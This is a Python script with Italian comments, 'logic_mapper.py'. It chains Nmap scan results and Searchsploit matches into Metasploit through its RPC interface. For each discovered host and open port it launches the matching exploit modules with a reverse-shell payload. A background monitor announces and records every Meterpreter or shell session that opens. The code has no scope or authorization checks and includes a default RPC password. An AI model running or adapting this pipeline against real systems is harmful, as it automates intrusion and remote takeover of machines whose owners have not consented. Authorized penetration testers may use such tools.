#!/usr/bin/env python3
"""
logic_mapper.py
────────────────────────────────────────────────────────────────
Cuore dell'automazione:
  1. Parsa l'XML di Nmap → estrae servizi e versioni
  2. Legge l'output JSON di Searchsploit → filtra exploit MSF
  3. Si connette a Metasploit via RPC (pymetasploit3)
  4. Carica i moduli e imposta RHOST automaticamente
  5. Salva tutto su SQLite
────────────────────────────────────────────────────────────────
Dipendenze:
  pip install pymetasploit3
"""

import argparse
import configparser
import json
import sqlite3
import sys
import threading
import time
import xml.etree.ElementTree as ET
from datetime import datetime
from pathlib import Path
from typing import Optional

# ── pymetasploit3 (import opzionale: gestito se mancante) ────
try:
    from pymetasploit3.msfrpc import MsfRpcClient
    MSF_AVAILABLE = True
except ImportError:
    print("[WARN] pymetasploit3 non trovata. Funzionalità MSF disabilitate.")
    MSF_AVAILABLE = False

# ─────────────────────────────────────────────────────────────
# Configurazione — letta da config.ini (mai committato su Git)
# Fallback sui valori di default se il file non esiste.
# ─────────────────────────────────────────────────────────────
def _load_config(path: str = "config.ini") -> configparser.ConfigParser:
    cfg = configparser.ConfigParser()
    cfg.read_dict({
        "metasploit": {"password": "iltuopassword",
                       "host": "127.0.0.1", "port": "55553"},
        "scanner":    {"output_dir": "./results",
                       "monitor_interval": "5",
                       "post_pipeline_wait": "10"},
        "database":   {"path": "./results/scanner.db"},
    })
    if Path(path).exists():
        cfg.read(path)
    else:
        print(f"[CONFIG] {path} non trovato, uso valori di default.")
    return cfg

_CFG = _load_config()

MSF_PASSWORD        = _CFG["metasploit"]["password"]
MSF_HOST            = _CFG["metasploit"]["host"]
MSF_PORT            = _CFG["metasploit"].getint("port")
DB_PATH             = _CFG["database"]["path"]
MONITOR_INTERVAL    = _CFG["scanner"].getint("monitor_interval")
POST_PIPELINE_WAIT  = _CFG["scanner"].getint("post_pipeline_wait")


# ─────────────────────────────────────────────────────────────
# Modulo 1 – Database
# ─────────────────────────────────────────────────────────────
class Database:
    def __init__(self, db_path: str = DB_PATH):
        Path(db_path).parent.mkdir(parents=True, exist_ok=True)
        self.conn = sqlite3.connect(db_path)
        self._create_tables()
        print(f"[DB] Connesso a: {db_path}")

    def _create_tables(self):
        cur = self.conn.cursor()
        cur.executescript("""
            CREATE TABLE IF NOT EXISTS Targets (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                ip          TEXT NOT NULL,
                hostname    TEXT,
                os_info     TEXT,
                scan_time   TEXT NOT NULL
            );

            CREATE TABLE IF NOT EXISTS Vulnerabilities (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                target_id   INTEGER REFERENCES Targets(id),
                port        INTEGER,
                protocol    TEXT,
                service     TEXT,
                version     TEXT,
                exploit_name TEXT,
                exploit_path TEXT,
                has_msf     INTEGER DEFAULT 0,
                found_time  TEXT NOT NULL
            );

            CREATE TABLE IF NOT EXISTS Exploits_Found (
                id           INTEGER PRIMARY KEY AUTOINCREMENT,
                vuln_id      INTEGER REFERENCES Vulnerabilities(id),
                msf_module   TEXT,
                rhost        TEXT,
                rport        INTEGER,
                session_id   INTEGER,
                success      INTEGER DEFAULT 0,
                attempt_time TEXT NOT NULL
            );
        """)
        self.conn.commit()

    def insert_target(self, ip: str, hostname: str = "",
                      os_info: str = "") -> int:
        cur = self.conn.cursor()
        cur.execute(
            "INSERT INTO Targets (ip, hostname, os_info, scan_time) "
            "VALUES (?, ?, ?, ?)",
            (ip, hostname, os_info, datetime.now().isoformat())
        )
        self.conn.commit()
        return cur.lastrowid

    def insert_vulnerability(self, target_id: int, port: int,
                             protocol: str, service: str, version: str,
                             exploit_name: str, exploit_path: str,
                             has_msf: bool) -> int:
        cur = self.conn.cursor()
        cur.execute(
            "INSERT INTO Vulnerabilities "
            "(target_id, port, protocol, service, version, "
            " exploit_name, exploit_path, has_msf, found_time) "
            "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
            (target_id, port, protocol, service, version,
             exploit_name, exploit_path, int(has_msf),
             datetime.now().isoformat())
        )
        self.conn.commit()
        return cur.lastrowid

    def insert_exploit_attempt(self, vuln_id: int, msf_module: str,
                                rhost: str, rport: int,
                                session_id: Optional[int],
                                success: bool) -> int:
        cur = self.conn.cursor()
        cur.execute(
            "INSERT INTO Exploits_Found "
            "(vuln_id, msf_module, rhost, rport, session_id, "
            " success, attempt_time) "
            "VALUES (?, ?, ?, ?, ?, ?, ?)",
            (vuln_id, msf_module, rhost, rport, session_id,
             int(success), datetime.now().isoformat())
        )
        self.conn.commit()
        return cur.lastrowid

    def close(self):
        self.conn.close()


# ─────────────────────────────────────────────────────────────
# Modulo 2 – Parser Nmap XML
# ─────────────────────────────────────────────────────────────
class NmapParser:
    """Estrae host, porte, servizi e versioni dall'XML di Nmap."""

    def __init__(self, xml_path: str):
        self.xml_path = xml_path

    def parse(self) -> list[dict]:
        """
        Restituisce lista di host:
          [{ ip, hostname, os, ports: [{port, protocol, service, version}] }]
        """
        hosts = []
        try:
            tree = ET.parse(self.xml_path)
            root = tree.getroot()
        except (ET.ParseError, FileNotFoundError) as e:
            print(f"[PARSER] Errore lettura XML: {e}")
            return hosts

        for host_el in root.findall("host"):
            # Stato host
            state_el = host_el.find("status")
            if state_el is None or state_el.get("state") != "up":
                continue

            # IP
            ip = ""
            for addr in host_el.findall("address"):
                if addr.get("addrtype") == "ipv4":
                    ip = addr.get("addr", "")
                    break

            # Hostname
            hostname = ""
            hn_el = host_el.find("hostnames/hostname")
            if hn_el is not None:
                hostname = hn_el.get("name", "")

            # OS (best match)
            os_info = ""
            os_el = host_el.find("os/osmatch")
            if os_el is not None:
                os_info = os_el.get("name", "")

            # Porte aperte
            ports = []
            for port_el in host_el.findall("ports/port"):
                state = port_el.find("state")
                if state is None or state.get("state") != "open":
                    continue

                port_num = int(port_el.get("portid", 0))
                protocol = port_el.get("protocol", "tcp")

                svc_el = port_el.find("service")
                service = ""
                version = ""
                if svc_el is not None:
                    service = svc_el.get("name", "")
                    product = svc_el.get("product", "")
                    ver     = svc_el.get("version", "")
                    version = f"{product} {ver}".strip()

                ports.append({
                    "port":     port_num,
                    "protocol": protocol,
                    "service":  service,
                    "version":  version,
                })

            if ip:
                hosts.append({
                    "ip":       ip,
                    "hostname": hostname,
                    "os":       os_info,
                    "ports":    ports,
                })

        print(f"[PARSER] Host trovati: {len(hosts)}")
        return hosts


# ─────────────────────────────────────────────────────────────
# Modulo 3 – Filtro Searchsploit → MSF
# ─────────────────────────────────────────────────────────────
class SearchsploitFilter:
    """
    Legge il JSON di searchsploit e torna solo gli exploit
    che hanno un modulo Metasploit corrispondente.
    """

    def __init__(self, json_path: str):
        self.json_path = json_path
        self._data = self._load()

    def _load(self) -> dict:
        try:
            with open(self.json_path, "r") as f:
                return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError) as e:
            print(f"[SSFILTER] Errore lettura JSON: {e}")
            return {}

    def get_msf_exploits(self) -> list[dict]:
        """
        Filtra le voci il cui Path contiene 'metasploit'
        o il cui titolo contiene 'MSF'.
        Restituisce: [{ title, path, type, ip? }]
        """
        results = []
        # searchsploit --nmap -j mette i risultati per IP
        for ip, exploits in self._data.items():
            if not isinstance(exploits, list):
                continue
            for ex in exploits:
                path  = ex.get("Path", "")
                title = ex.get("Title", "")
                # Criterio principale: il percorso passa da /modules/ di MSF
                # oppure il titolo indica "Metasploit"
                if "metasploit" in path.lower() or "msf" in title.lower():
                    results.append({
                        "ip":    ip,
                        "title": title,
                        "path":  path,
                        "type":  ex.get("Type", ""),
                    })
        print(f"[SSFILTER] Exploit MSF-compatibili trovati: {len(results)}")
        return results

    def get_all_exploits(self) -> list[dict]:
        """Tutti gli exploit, non solo quelli MSF."""
        results = []
        for ip, exploits in self._data.items():
            if not isinstance(exploits, list):
                continue
            for ex in exploits:
                results.append({
                    "ip":    ip,
                    "title": ex.get("Title", ""),
                    "path":  ex.get("Path", ""),
                    "type":  ex.get("Type", ""),
                })
        return results


# ─────────────────────────────────────────────────────────────
# Modulo 4 – Metasploit RPC Client
# ─────────────────────────────────────────────────────────────
class MetasploitManager:
    """
    Si connette a msfrpcd e automatizza:
      - Caricamento modulo exploit
      - Impostazione RHOST / RPORT
      - Esecuzione e recupero sessioni
    """

    def __init__(self, password: str = MSF_PASSWORD,
                 host: str = MSF_HOST, port: int = MSF_PORT):
        self.client = None
        if not MSF_AVAILABLE:
            print("[MSF] pymetasploit3 non disponibile, skip connessione.")
            return
        try:
            self.client = MsfRpcClient(password, server=host, port=port)
            print(f"[MSF] Connesso a msfrpcd su {host}:{port}")
        except Exception as e:
            print(f"[MSF] Connessione fallita: {e}")
            self.client = None

    def is_connected(self) -> bool:
        return self.client is not None

    def path_to_module(self, exploit_path: str) -> Optional[str]:
        """
        Converte un percorso searchsploit nel nome modulo MSF.
        Es: /usr/share/metasploit-framework/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
            → exploits/unix/ftp/vsftpd_234_backdoor
        """
        if "modules/" not in exploit_path:
            return None
        after = exploit_path.split("modules/", 1)[1]
        return after.replace(".rb", "").strip()

    def run_exploit(self, module_path: str,
                    rhost: str, rport: int = 0) -> dict:
        """
        Tenta di eseguire un exploit e restituisce
        { success, session_id, error }.
        """
        if not self.is_connected():
            return {"success": False, "session_id": None,
                    "error": "Client non connesso"}

        try:
            exploit = self.client.modules.use("exploit", module_path)
            exploit["RHOST"] = rhost
            if rport:
                exploit["RPORT"] = rport

            # Payload generico (meterpreter o shell)
            payload = self.client.modules.use("payload",
                        "generic/shell_reverse_tcp")
            print(f"[MSF] Lancio: {module_path} → {rhost}:{rport}")

            job_id = exploit.execute(payload=payload)
            print(f"[MSF] Job avviato: {job_id}")

            # Aspetta brevemente e controlla le sessioni
            time.sleep(5)
            sessions = self.client.sessions.list
            new_sessions = {sid: s for sid, s in sessions.items()
                            if s.get("via_exploit") == module_path
                            and s.get("target_host") == rhost}

            if new_sessions:
                sid = list(new_sessions.keys())[0]
                print(f"[MSF] ✓ Sessione aperta: {sid}")
                return {"success": True, "session_id": int(sid), "error": None}
            else:
                print(f"[MSF] ✗ Nessuna sessione aperta.")
                return {"success": False, "session_id": None, "error": None}

        except Exception as e:
            print(f"[MSF] Errore esecuzione: {e}")
            return {"success": False, "session_id": None, "error": str(e)}


# ─────────────────────────────────────────────────────────────
# Modulo 5 – Monitor Sessioni Meterpreter
# ─────────────────────────────────────────────────────────────
class MeterpreterMonitor:
    """
    Thread in background che fa polling su msfrpcd ogni N secondi.
    Quando rileva una sessione Meterpreter nuova (o qualsiasi
    sessione interattiva), stampa un avviso visibile con banner
    colorato e salva l'evento nel database.

    Funzionamento:
      - Mantiene un set degli ID sessione già notificati.
      - Ogni `interval` secondi confronta la lista corrente
        con lo snapshot precedente.
      - Le nuove sessioni vengono classificate:
          • 'meterpreter'  → banner ★ METERPRETER
          • 'shell'        → banner ✓ SHELL
          • altro          → banner ~ SESSIONE
    """

    # Codici ANSI per la stampa colorata
    _RED    = "\033[91m"
    _GREEN  = "\033[92m"
    _YELLOW = "\033[93m"
    _CYAN   = "\033[96m"
    _BOLD   = "\033[1m"
    _RESET  = "\033[0m"

    def __init__(self, msf_client, db: "Database",
                 interval: int = 5):
        """
        msf_client : istanza MsfRpcClient già autenticata
        db         : istanza Database condivisa
        interval   : secondi tra un polling e l'altro
        """
        self.client       = msf_client
        self.db           = db
        self.interval     = interval
        self._known_sids  : set[str] = set()
        self._stop_event  = threading.Event()
        self._thread      = threading.Thread(
            target=self._poll_loop,
            name="MeterpreterMonitor",
            daemon=True          # termina con il processo principale
        )

    # ── Avvio / stop ────────────────────────────────────────
    def start(self):
        """Avvia il thread di monitoraggio."""
        # Snapshot iniziale: non notificare sessioni già aperte
        try:
            self._known_sids = set(
                str(k) for k in self.client.sessions.list.keys()
            )
        except Exception:
            self._known_sids = set()

        self._thread.start()
        print(f"{self._CYAN}[MONITOR] Avviato. "
              f"Polling ogni {self.interval}s.{self._RESET}")

    def stop(self):
        """Ferma il thread pulitamente."""
        self._stop_event.set()
        self._thread.join(timeout=self.interval + 2)
        print(f"{self._CYAN}[MONITOR] Arrestato.{self._RESET}")

    # ── Loop principale ──────────────────────────────────────
    def _poll_loop(self):
        while not self._stop_event.is_set():
            try:
                self._check_sessions()
            except Exception as e:
                # Non crashare mai: il polling deve essere resiliente
                print(f"[MONITOR] Errore polling: {e}")
            self._stop_event.wait(self.interval)

    def _check_sessions(self):
        sessions: dict = self.client.sessions.list   # {sid_str: info_dict}
        current_sids   = set(str(k) for k in sessions.keys())
        new_sids       = current_sids - self._known_sids

        for sid in new_sids:
            info = sessions.get(sid, {})
            self._notify(sid, info)
            self._persist(sid, info)

        self._known_sids = current_sids

    # ── Notifica a schermo ───────────────────────────────────
    def _notify(self, sid: str, info: dict):
        stype      = info.get("type", "unknown").lower()      # meterpreter / shell
        rhost      = info.get("target_host", "?")
        via_module = info.get("via_exploit", "?")
        username   = info.get("username", "?")
        platform   = info.get("platform", "?")
        arch       = info.get("arch", "?")
        opened_at  = datetime.now().strftime("%H:%M:%S")

        # Scegli stile in base al tipo di sessione
        if "meterpreter" in stype:
            icon   = "★"
            label  = "METERPRETER SESSION"
            color  = self._GREEN
        elif "shell" in stype:
            icon   = "✓"
            label  = "SHELL SESSION"
            color  = self._YELLOW
        else:
            icon   = "~"
            label  = "NUOVA SESSIONE"
            color  = self._CYAN

        banner = (
            f"\n{color}{self._BOLD}"
            f"╔══════════════════════════════════════════════╗\n"
            f"║  {icon}  {label:<40}║\n"
            f"╠══════════════════════════════════════════════╣\n"
            f"║  Session ID : {sid:<31}║\n"
            f"║  Target     : {rhost:<31}║\n"
            f"║  Tipo       : {stype:<31}║\n"
            f"║  Piattaforma: {platform} / {arch:<26}║\n"
            f"║  Utente     : {username:<31}║\n"
            f"║  Modulo     : {via_module[:31]:<31}║\n"
            f"║  Ora        : {opened_at:<31}║\n"
            f"╚══════════════════════════════════════════════╝"
            f"{self._RESET}\n"
        )
        # Stampa in modo thread-safe (print è GIL-protected)
        print(banner, flush=True)

    # ── Persistenza DB ───────────────────────────────────────
    def _persist(self, sid: str, info: dict):
        """
        Aggiorna Exploits_Found: se esiste una riga con session_id=None
        per questo rhost, la aggiorna; altrimenti inserisce una nuova riga
        di tipo 'monitor' per tracciarla comunque.
        """
        rhost      = info.get("target_host", "")
        via_module = info.get("via_exploit", "")
        stype      = info.get("type", "unknown")

        try:
            cur = self.db.conn.cursor()

            # Cerca una riga exploit già esistente senza sessione per questo host
            cur.execute(
                "SELECT id FROM Exploits_Found "
                "WHERE rhost=? AND session_id IS NULL "
                "ORDER BY attempt_time DESC LIMIT 1",
                (rhost,)
            )
            row = cur.fetchone()

            if row:
                cur.execute(
                    "UPDATE Exploits_Found "
                    "SET session_id=?, success=1, attempt_time=? "
                    "WHERE id=?",
                    (int(sid), datetime.now().isoformat(), row[0])
                )
            else:
                # Sessione rilevata dal monitor ma non avviata da noi:
                # la registriamo comunque come evento di audit.
                cur.execute(
                    "INSERT INTO Exploits_Found "
                    "(vuln_id, msf_module, rhost, rport, session_id, "
                    " success, attempt_time) "
                    "VALUES (NULL, ?, ?, NULL, ?, 1, ?)",
                    (via_module or f"[monitor/{stype}]",
                     rhost, int(sid), datetime.now().isoformat())
                )

            self.db.conn.commit()
        except Exception as e:
            print(f"[MONITOR] Errore DB: {e}")


# ─────────────────────────────────────────────────────────────
# Orchestratore principale
# ─────────────────────────────────────────────────────────────
class LogicMapper:
    def __init__(self, xml_path: str, json_path: str,
                 monitor_interval: int = 5):
        self.xml_path  = xml_path
        self.json_path = json_path
        self.db        = Database()
        self.msf       = MetasploitManager()
        self.monitor   : Optional[MeterpreterMonitor] = None
        self._monitor_interval = monitor_interval

    def run(self):
        print("\n" + "="*55)
        print("  LOGIC MAPPER – Avvio pipeline")
        print("="*55 + "\n")

        # ── Avvia monitor sessioni (se MSF disponibile) ───────
        if self.msf.is_connected():
            self.monitor = MeterpreterMonitor(
                self.msf.client, self.db, self._monitor_interval
            )
            self.monitor.start()

        # ── Step 1: Parsa Nmap XML ────────────────────
        parser = NmapParser(self.xml_path)
        hosts  = parser.parse()

        if not hosts:
            print("[MAPPER] Nessun host rilevato. Terminazione.")
            self.db.close()
            return

        # ── Step 2: Filtra exploit MSF da searchsploit ─
        ss_filter   = SearchsploitFilter(self.json_path)
        msf_exploits = ss_filter.get_msf_exploits()
        all_exploits = ss_filter.get_all_exploits()

        # Dizionario veloce ip → exploits
        exploits_by_ip: dict[str, list] = {}
        for ex in all_exploits:
            exploits_by_ip.setdefault(ex["ip"], []).append(ex)

        # ── Step 3: Per ogni host, persiste e tenta exploit ─
        for host in hosts:
            ip       = host["ip"]
            hostname = host["hostname"]
            os_info  = host["os"]

            target_id = self.db.insert_target(ip, hostname, os_info)
            print(f"\n[MAPPER] Host: {ip} ({hostname or 'n/a'}) "
                  f"OS: {os_info or 'sconosciuto'}")

            host_exploits = exploits_by_ip.get(ip, [])

            for port_info in host["ports"]:
                port     = port_info["port"]
                protocol = port_info["protocol"]
                service  = port_info["service"]
                version  = port_info["version"]

                print(f"  ↳ Porta {port}/{protocol}: "
                      f"{service} {version}")

                # Cerca exploit per questo host/porta
                for ex in host_exploits:
                    has_msf = "metasploit" in ex["path"].lower()
                    vuln_id = self.db.insert_vulnerability(
                        target_id, port, protocol,
                        service, version,
                        ex["title"], ex["path"], has_msf
                    )

                    if has_msf and self.msf.is_connected():
                        mod = self.msf.path_to_module(ex["path"])
                        if mod:
                            print(f"    → Tentativo MSF: {mod}")
                            result = self.msf.run_exploit(mod, ip, port)
                            self.db.insert_exploit_attempt(
                                vuln_id, mod, ip, port,
                                result["session_id"],
                                result["success"]
                            )

        print("\n[MAPPER] Pipeline completata. Dati salvati nel DB.")

        # ── Stop monitor ──────────────────────────────────────
        if self.monitor:
            print(f"[MAPPER] Attendo {POST_PIPELINE_WAIT}s per sessioni ritardate...\n")
            time.sleep(POST_PIPELINE_WAIT)
            self.monitor.stop()

        self.db.close()


# ─────────────────────────────────────────────────────────────
# Entrypoint
# ─────────────────────────────────────────────────────────────
def main():
    ap = argparse.ArgumentParser(
        description="Logic Mapper – Nmap + Searchsploit + Metasploit"
    )
    ap.add_argument("--xml",  required=True, help="Percorso XML Nmap")
    ap.add_argument("--json", required=True, help="Percorso JSON Searchsploit")
    ap.add_argument("--monitor-interval", type=int, default=5,
                    metavar="SEC",
                    help="Secondi tra un polling del monitor e l'altro (default: 5)")
    args = ap.parse_args()

    mapper = LogicMapper(args.xml, args.json, args.monitor_interval)
    mapper.run()


if __name__ == "__main__":
    main()
